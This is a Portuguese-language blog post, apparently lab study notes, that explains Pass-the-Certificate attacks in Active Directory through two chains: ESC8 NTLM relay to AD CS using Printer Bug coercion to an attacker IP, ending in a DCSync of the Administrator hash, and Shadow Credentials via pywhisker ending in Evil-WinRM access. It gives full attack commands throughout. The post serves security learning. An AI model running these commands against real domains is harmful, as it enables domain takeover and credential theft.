---
title: "Pass the Certificate"
date: 2026-08-07 10:00:00 -0300
categories: [Conceitos, Windows]
tags: [windows, kerberos, pkinit, pass-the-certificate, esc8, shadow-credentials, pywhisker, ntlmrelayx, dcsync, pass-the-ticket, evil-winrm]
---

O **PKINIT** (Public Key Cryptography for Initial Authentication) estende o Kerberos para suportar autenticação por chave pública, enquanto o **Pass-the-Certificate** usa certificados X.509 para obter TGTs, comumente em ataques de **AD CS** e **Shadow Credentials**.

## Ataque de NTLM Relay contra o AD CS (ESC8)

O **ESC8** é um **ataque de NTLM relay** contra o **AD CS Web Enrollment**, um endpoint de inscrição de certificados baseado em HTTP. Ao repassar (relay) a autenticação NTLM de uma conta coagida para esse endpoint, um atacante consegue solicitar um certificado em nome dessa conta e depois usá-lo para obter um TGT Kerberos via PKINIT. Ferramentas como o **`ntlmrelayx` do Impacket** automatizam esse processo, escutando conexões NTLM recebidas e as repassando para o endpoint de inscrição vulnerável.

```bash
impacket-ntlmrelayx -t http://<DOMAIN>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

Tentativas de autenticação NTLM podem ser capturadas passivamente ou coagidas ativamente. Um método comum é o [Printer Bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), que abusa do serviço **Print Spooler** para forçar uma conta de computador, como um Domain Controller, a se autenticar num host arbitrário:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PASSWORD>"@<DC_IP> <ATTACKER_IP>
```

Assim que o certificado de `DC01$` é obtido, o `gettgtpkinit.py` o usa para realizar **Pass-the-Certificate** e solicitar um TGT para a conta de computador do domain controller:

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../krbrelayx/DC01\$.pfx \
  -dc-ip <DC_IP> \
  'inlanefreight.local/dc01$' \
  /tmp/dc.ccache
```

Carregar o arquivo ccache resultante via `KRB5CCNAME` permite autenticação por **Pass-the-Ticket**:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Como `DC01$` tem privilégios suficientes, o ticket pode então ser usado para realizar um ataque de **DCSync** e recuperar credenciais sensíveis do domínio, como o hash NTLM do `Administrator`:

```bash
impacket-secretsdump \
  -k \
  -no-pass \
  -dc-ip <DC_IP> \
  -just-dc-user Administrator \
  'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

**Cadeia de ataque**: Autenticação coagida (Printer Bug) → NTLM Relay (ESC8) → Certificado → PKINIT → TGT → Pass-the-Ticket → DCSync.

## Shadow Credentials (msDS-KeyCredentialLink)

O **Shadow Credentials** abusa do atributo `msDS-KeyCredentialLink` no Active Directory, que armazena chaves públicas usadas para autenticação PKINIT. Um atacante com acesso de escrita a esse atributo numa conta alvo — representado no BloodHound pela aresta `AddKeyCredentialLink` — consegue adicionar seu próprio material de chave e, na prática, se autenticar como esse usuário.

Usando o `pywhisker`, o atacante gera um certificado X.509 e adiciona sua chave pública ao `msDS-KeyCredentialLink` do alvo, produzindo um arquivo `.pfx` que pode ser usado para autenticação:

```bash
pywhisker \
  --dc-ip <DC_IP> \
  -d INLANEFREIGHT.LOCAL \
  -u <USER> \
  -p '<PASSWORD>' \
  --target <TARGET_USER> \
  --action add
```

O certificado PFX gerado é fornecido ao `gettgtpkinit.py` para obter um TGT para a conta alvo, que pode então ser carregado via `KRB5CCNAME` para Pass-the-Ticket, da mesma forma que antes:

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../<CERT_FILE>.pfx \
  -pfx-pass '<PFX_PASSWORD>' \
  -dc-ip <DC_IP> \
  INLANEFREIGHT.LOCAL/<TARGET_USER> \
  /tmp/<TARGET_USER>.ccache
```

```bash
export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
klist
```

Se a conta alvo tiver privilégios apropriados, como participação no grupo **Remote Management Users**, o ticket pode ser usado para autenticação Kerberos através do **Evil-WinRM**:

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

**Cadeia de ataque**: Acesso de escrita ao `msDS-KeyCredentialLink` → Shadow Credentials → Certificado → PKINIT → TGT → Pass-the-Ticket → Acesso como a vítima.